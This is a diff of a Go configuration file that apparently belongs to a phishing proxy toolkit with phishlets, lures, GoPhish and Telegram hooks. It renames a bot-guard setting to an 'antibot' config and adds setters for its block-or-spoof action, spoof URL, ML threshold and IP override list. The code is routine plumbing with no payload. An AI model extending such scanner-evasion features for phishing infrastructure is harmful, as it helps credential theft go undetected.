@@ -84,10 +84,12 @@ type DNSProviderConfig struct {
 	WildcardEnabled bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
 }
 
-type BotguardConfig struct {
-	Enabled     bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
-	Sensitivity string `mapstructure:"sensitivity" json:"sensitivity" yaml:"sensitivity"`
-	SpoofURL    string `mapstructure:"spoof_url" json:"spoof_url" yaml:"spoof_url"`
+type AntibotConfig struct {
+	Enabled     bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	OverrideIPs []string `mapstructure:"override_ips" json:"override_ips" yaml:"override_ips"`
+	Action      string   `mapstructure:"action" json:"action" yaml:"action"` // "block", "spoof"
+	SpoofUrl    string   `mapstructure:"spoof_url" json:"spoof_url" yaml:"spoof_url"`
+	MLThreshold float64  `mapstructure:"ml_threshold" json:"ml_threshold" yaml:"ml_threshold"`
 }
 
 type JSObfuscationConfig struct {
@@ -140,15 +142,16 @@ type GeneralConfig struct {
 }
 
 type Config struct {
-	general                *GeneralConfig
-	certificates           *CertificatesConfig
-	blacklistConfig        *BlacklistConfig
-	whitelistConfig        *WhitelistConfig
-	gophishConfig          *GoPhishConfig
-	telegramConfig         *TelegramConfig
-	proxyConfig            *ProxyConfig
-	dnsProviderConfig      *DNSProviderConfig
-	botguardConfig         *BotguardConfig
+	general           *GeneralConfig
+	certificates      *CertificatesConfig
+	blacklistConfig   *BlacklistConfig
+	whitelistConfig   *WhitelistConfig
+	gophishConfig     *GoPhishConfig
+	telegramConfig    *TelegramConfig
+	proxyConfig       *ProxyConfig
+	dnsProviderConfig *DNSProviderConfig
+	antibotConfig     *AntibotConfig
+
 	jsObfuscationConfig    *JSObfuscationConfig
 	mlDetectorConfig       *MLDetectorConfig
 	captchaConfig          *CaptchaConfig
@@ -171,18 +174,19 @@ type Config struct {
 }
 
 const (
-	CFG_GENERAL           = "general"
-	CFG_CERTIFICATES      = "certificates"
-	CFG_LURES             = "lures"
-	CFG_PROXY             = "proxy"
-	CFG_PHISHLETS         = "phishlets"
-	CFG_BLACKLIST         = "blacklist"
-	CFG_WHITELIST         = "whitelist"
-	CFG_SUBPHISHLETS      = "subphishlets"
-	CFG_GOPHISH           = "gophish"
-	CFG_TELEGRAM          = "telegram"
-	CFG_DNS_PROVIDER      = "dns_provider"
-	CFG_BOTGUARD          = "botguard"
+	CFG_GENERAL      = "general"
+	CFG_CERTIFICATES = "certificates"
+	CFG_LURES        = "lures"
+	CFG_PROXY        = "proxy"
+	CFG_PHISHLETS    = "phishlets"
+	CFG_BLACKLIST    = "blacklist"
+	CFG_WHITELIST    = "whitelist"
+	CFG_SUBPHISHLETS = "subphishlets"
+	CFG_GOPHISH      = "gophish"
+	CFG_TELEGRAM     = "telegram"
+	CFG_DNS_PROVIDER = "dns_provider"
+	CFG_ANTIBOT      = "antibot"
+
 	CFG_JS_OBFUSCATION    = "js_obfuscation"
 	CFG_ML_DETECTOR       = "ml_detector"
 	CFG_CAPTCHA           = "captcha"
@@ -203,12 +207,13 @@ func (c *Config) Save() error {
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
-		general:                &GeneralConfig{},
-		certificates:           &CertificatesConfig{},
-		gophishConfig:          &GoPhishConfig{},
-		telegramConfig:         &TelegramConfig{},
-		dnsProviderConfig:      &DNSProviderConfig{},
-		botguardConfig:         &BotguardConfig{},
+		general:           &GeneralConfig{},
+		certificates:      &CertificatesConfig{},
+		gophishConfig:     &GoPhishConfig{},
+		telegramConfig:    &TelegramConfig{},
+		dnsProviderConfig: &DNSProviderConfig{},
+		antibotConfig:     &AntibotConfig{Enabled: true, Action: "block", MLThreshold: 0.85},
+
 		jsObfuscationConfig:    &JSObfuscationConfig{},
 		mlDetectorConfig:       &MLDetectorConfig{Enabled: true, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
 		captchaConfig:          &CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]ProviderConfig)},
@@ -284,7 +289,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	c.cfg.UnmarshalKey(CFG_DNS_PROVIDER, &c.dnsProviderConfig)
 
-	c.cfg.UnmarshalKey(CFG_BOTGUARD, &c.botguardConfig)
+	c.cfg.UnmarshalKey(CFG_ANTIBOT, &c.antibotConfig)
 
 	c.cfg.UnmarshalKey(CFG_JS_OBFUSCATION, &c.jsObfuscationConfig)
 
@@ -1367,17 +1372,8 @@ func (c *Config) GetTrustedProxies() []string {
 	return c.general.TrustedProxies
 }
 
-func (c *Config) GetBotguardConfig() *BotguardConfig {
-	return c.botguardConfig
-}
-
-func (c *Config) SetBotguard(enabled bool, sensitivity string, spoofURL string) {
-	c.botguardConfig.Enabled = enabled
-	c.botguardConfig.Sensitivity = sensitivity
-	c.botguardConfig.SpoofURL = spoofURL
-	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
-	log.Info("botguard configuration updated")
-	c.cfg.WriteConfig()
+func (c *Config) GetAntibotConfig() *AntibotConfig {
+	return c.antibotConfig
 }
 
 func (c *Config) GetJSObfuscationConfig() *JSObfuscationConfig {
@@ -1773,4 +1769,58 @@ func (c *Config) SetLureGenerationStrategy(strategy string) {
 	c.cfg.Set(CFG_LURE_GENERATION, c.lureGenerationConfig)
 	log.Info("Lure generation strategy set to: %s", strategy)
 	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotEnabled(enabled bool) {
+	c.antibotConfig.Enabled = enabled
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot protection enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotAction(action string) {
+	c.antibotConfig.Action = action
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot action set to: %s", action)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotSpoofUrl(url string) {
+	c.antibotConfig.SpoofUrl = url
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot spoof URL set to: %s", url)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotThreshold(threshold float64) {
+	c.antibotConfig.MLThreshold = threshold
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot ML threshold set to: %.2f", threshold)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) AddAntibotOverrideIP(ip string) error {
+	for _, i := range c.antibotConfig.OverrideIPs {
+		if i == ip {
+			return fmt.Errorf("ip %s already exists in override list", ip)
+		}
+	}
+	c.antibotConfig.OverrideIPs = append(c.antibotConfig.OverrideIPs, ip)
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Added IP %s to antibot override list", ip)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) RemoveAntibotOverrideIP(ip string) error {
+	for i, v := range c.antibotConfig.OverrideIPs {
+		if v == ip {
+			c.antibotConfig.OverrideIPs = append(c.antibotConfig.OverrideIPs[:i], c.antibotConfig.OverrideIPs[i+1:]...)
+			c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+			log.Info("Removed IP %s from antibot override list", ip)
+			c.cfg.WriteConfig()
+			return nil
+		}
+	}
+	return fmt.Errorf("ip %s not found in override list", ip)
 }
